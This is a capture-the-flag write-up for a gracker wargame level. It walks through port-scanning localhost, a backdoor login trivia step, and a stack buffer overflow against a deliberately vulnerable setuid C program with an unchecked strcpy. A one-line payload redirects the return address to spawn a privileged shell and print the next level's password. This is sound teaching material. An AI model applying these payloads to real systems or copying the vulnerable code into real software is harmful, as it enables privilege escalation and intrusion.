Exercise
========

```
user@system ~ $ ssh level6@gracker.org
      __                  _
     / /                 | |
    / /_ _ _ __ __ _  ___| | _____ _ __
   / / _` | '__/ _` |/ __| |/ / _ \ '__|
  / / (_| | | | (_| | (__|   <  __/ |
 /_/ \__, |_|  \__,_|\___|_|\_\___|_|
      __/ |
     |___/
             ~ follow the white rabbit ~
                     ~ gracker ~
            ~ irc.hackint.org  #gracker ~
level6@gracker.org's password:
X11 forwarding request failed on channel 0
The Grid...
```
```
level6@gracker:~$ cat recap
First of all we can convert the hints into decimal numbers. I usually use python for that.

    level5@gracker:~$ python
    Python 2.7.9 (default, Mar  1 2015, 12:57:24)
    [GCC 4.9.2] on linux2
    Type "help", "copyright", "credits" or "license" for more information.
    >>> 0x5ad
    1453
    >>> 0xdad
    3501


Then we can perform a portscan with `nmap`. Because we don't run `nmap` as root, it can't
use icmp ping to check if the host is up. So we have to use the -Pn parameter.



    level5@gracker:~$ nmap -p1453-3501 -Pn 127.0.0.1

    Starting Nmap 6.47 ( http://nmap.org ) at 2015-06-21 02:30 CEST
    Nmap scan report for localhost (127.0.0.1)
    Host is up (0.00017s latency).
    Not shown: 2048 filtered ports
    PORT     STATE SERVICE
    2989/tcp open  unknown

    Nmap done: 1 IP address (1 host up) scanned in 21.48 seconds


Now we found out that tcp port 2989 (funfact: in hex 0xbad) is open. So we can use
netcat to talk with the port. It shows us a command trace. So this level is not really
a security issue. But more like a little trivia/recon game. The solution is to pass
the command that Flynn got into the GRID `LLLSDLaserControl`.
After that command you get an OS shell as level6 and can read the password



    level5@gracker:~$ nc 127.0.0.1 2989
    $ whoami
    flynn
    $ uname -a
    SolarOs 4.0.1 Generic_50203-02 sun4m i386
    Unknown.Unknown
    $ login -n root
    Login incorrect
    login: backdoor
    No home directory specified in password file!
    Logging in with home=/
    # bin/history
      499 kill 2208
      500 ps -a -x -u
      501 touch /opt/LLL/run/ok
      502 LLLSDLaserControl -ok 1
    # LLLSDLaserControl
    You entered the Grid!
    level6@TRON $ id
    uid=1006(level6) gid=1006(level6) groups=1006(level6)
```
```
level6@gracker:~$ cat story
┌──────────────────────────────────────┐
│ Past the Portal. Into the unknown... │
└──────────────────────────────────────┘
You got in! You went through the portal and arrived at the Outlands of the
TRON system.  What is this place?  Are you a user,  or a program?  The MCP
(Master Control Program) administers  the ENCOM company's computer system.
┌────────────────┐ It has to protect the Portal  from stray programs  that
│   |        |   │ want to leave  the  system.  It won't  let you go  into
│   | \    / |   │ Arjia City  if you cannot proof  that you belong there.
│   | 0    0 |   │ Can you bypass it?
│   |   ..   |   │ Are you worth entering the TRON System?
│   |  ____  |   │
│    \      /    │
│     \    /     │ For this level you should use `gdb`  to understand how
│      \  /      │ calling functions work in assembler.  And how do those
│       \/       │ functions return?
│       /\       │
│      /  \      │ You should also listen to the TRON:Legacy Soundtrack!
└────────────────┘
```
Solution
========
```
level6@gracker:~$ /matrix/level6/level6
usage: /matrix/level6/level6 <input>
```
```
level6@gracker:~$ /matrix/level6/level6 AAAA
Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
What are you doing here? Are you a user or a program?
Where did you come from? Proof your identity:
Return to: 0x8048690
```
Let's take a look into the source code in order to find out how we could exploit the program:
```
level6@gracker:~$cat /matrix/level6/level6.c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

// gcc level6.c -fno-stack-protector -z execstack -m32 -o level6

void spawn_shell() {
    printf("Welcome to Arjia City!\n");
    gid_t gid;
    uid_t uid;
    gid = getegid();
    uid = geteuid();
    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);
    system("/bin/sh");
}

void gates_of_arjia(char *input) {
    char buffer[32];
    strcpy(buffer, input);
    printf("Return to: %p\n", __builtin_return_address(0));
}

int main(int argc, char **argv)
{
    if(argc!=2) {
        printf("usage: %s <input>\n", argv[0]);
        exit(1);
    }
    printf("Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.\n");
    printf("What are you doing here? Are you a user or a program?\n");
    printf("Where did you come from? Proof your identity:\n");
    gates_of_arjia(argv[1]);
    exit(0);
}
```
Obviously we have to overflow the buffer once again with our input. This time we have to fill the buffer but put a valid address at the end of our payload which will overwrite the return address of ```main```. In order to get a shell with the privileges of user ```level5```, we have to return to function ```spawn_shell``` instead of just returning to ```main```.
Let's determine how many bytes we have to enter in order to overflow the buffer and overwrite the return address on stack:
```
level6@gracker:~$ /matrix/level6/level6 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
What are you doing here? Are you a user or a program?
Where did you come from? Proof your identity:
Return to: 0x42424242
zsh: segmentation fault
```
Then we have to find out the address of function ```spawn_shell```:
```
level6@gracker:~$ nm /matrix/level6/level6 | grep spawn_shell
0804858b T spawn_shell
```
And finally we use this informtion in order to overflow the buffer and overwrite the return address on stack with the valid address of ```spawn_shell``` in order to get a more privileged shell and display the next level's password:
```
level6@gracker:~$ /matrix/level6/level6 `python -c 'print "A"*44 + "\x8b\x85\x04\x08"'`
Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
What are you doing here? Are you a user or a program?
Where did you come from? Proof your identity:
Return to: 0x804858b
Welcome to Arjia City!
$ cat /home/level7/.pass
czO0-Uf#lvhY
```

```
level6@gracker:~$ gdb -q /matrix/level6/level6
Reading symbols from /matrix/level6/level6...(no debugging symbols found)...done.
(gdb) set disassembly-flavor intel
(gdb)  disass main
Dump of assembler code for function main:
   0x08048619 <+0>:	lea    ecx,[esp+0x4]
   0x0804861d <+4>:	and    esp,0xfffffff0
   0x08048620 <+7>:	push   DWORD PTR [ecx-0x4]
   0x08048623 <+10>:	push   ebp
   0x08048624 <+11>:	mov    ebp,esp
   0x08048626 <+13>:	push   ebx
   0x08048627 <+14>:	push   ecx
   0x08048628 <+15>:	mov    ebx,ecx
   0x0804862a <+17>:	cmp    DWORD PTR [ebx],0x2
   0x0804862d <+20>:	je     0x804864f <main+54>
   0x0804862f <+22>:	mov    eax,DWORD PTR [ebx+0x4]
   0x08048632 <+25>:	mov    eax,DWORD PTR [eax]
   0x08048634 <+27>:	sub    esp,0x8
   0x08048637 <+30>:	push   eax
   0x08048638 <+31>:	push   0x804875e
   0x0804863d <+36>:	call   0x80483f0 <printf@plt>
   0x08048642 <+41>:	add    esp,0x10
   0x08048645 <+44>:	sub    esp,0xc
   0x08048648 <+47>:	push   0x1
   0x0804864a <+49>:	call   0x8048460 <exit@plt>
   0x0804864f <+54>:	sub    esp,0xc
   0x08048652 <+57>:	push   0x8048774
   0x08048657 <+62>:	call   0x8048430 <puts@plt>
   0x0804865c <+67>:	add    esp,0x10
   0x0804865f <+70>:	sub    esp,0xc
   0x08048662 <+73>:	push   0x80487c8
   0x08048667 <+78>:	call   0x8048430 <puts@plt>
   0x0804866c <+83>:	add    esp,0x10
   0x0804866f <+86>:	sub    esp,0xc
   0x08048672 <+89>:	push   0x8048800
   0x08048677 <+94>:	call   0x8048430 <puts@plt>
   0x0804867c <+99>:	add    esp,0x10
   0x0804867f <+102>:	mov    eax,DWORD PTR [ebx+0x4]
---Type <return> to continue, or q <return> to quit---
   0x08048682 <+105>:	add    eax,0x4
   0x08048685 <+108>:	mov    eax,DWORD PTR [eax]
   0x08048687 <+110>:	sub    esp,0xc
   0x0804868a <+113>:	push   eax
   0x0804868b <+114>:	call   0x80485eb <gates_of_arjia>
   0x08048690 <+119>:	add    esp,0x10
   0x08048693 <+122>:	sub    esp,0xc
   0x08048696 <+125>:	push   0x0
   0x08048698 <+127>:	call   0x8048460 <exit@plt>
End of assembler dump.
```
